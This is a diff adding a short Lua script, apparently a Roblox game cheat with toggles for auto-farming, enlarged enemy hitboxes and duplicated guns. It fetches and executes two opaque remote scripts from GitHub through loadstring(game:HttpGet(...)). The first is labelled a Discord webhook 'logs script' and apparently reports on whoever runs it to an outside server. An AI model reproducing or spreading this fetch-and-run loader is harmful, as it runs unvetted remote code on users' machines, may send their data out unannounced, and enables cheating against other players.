@@ -1,0 +1,18 @@
+_G.Settings = false
+-- Logs script: https://discord.gg/3kZ7dKbJPe
+
+-- Load the webhook
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/FunctionNil/refs/heads/main/Discord_WebHook"))()
+print("Webhook loaded: https://discord.gg/3kZ7dKbJPe")
+wait(0.1)
+
+-- Define common settings
+_G.farm2 = false -- Auto Farm (true / false)
+_G.groundDistance = 0 -- Auto Farm +/- Up / Down
+_G.dist = 100000 -- Search-Zombie Distance
+_G.HeadSize = 2.5 -- Hitbox size
+_G.autoequip = false -- Auto Equip Tools + Duplicate Guns More Damage OP (true / false)
+_G.AutoGetPowerups = false -- Auto Get powerups (true / false)
+
+-- Load the necessary script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/ZXwtccwtwct4/refs/heads/main/hdfdf"))()
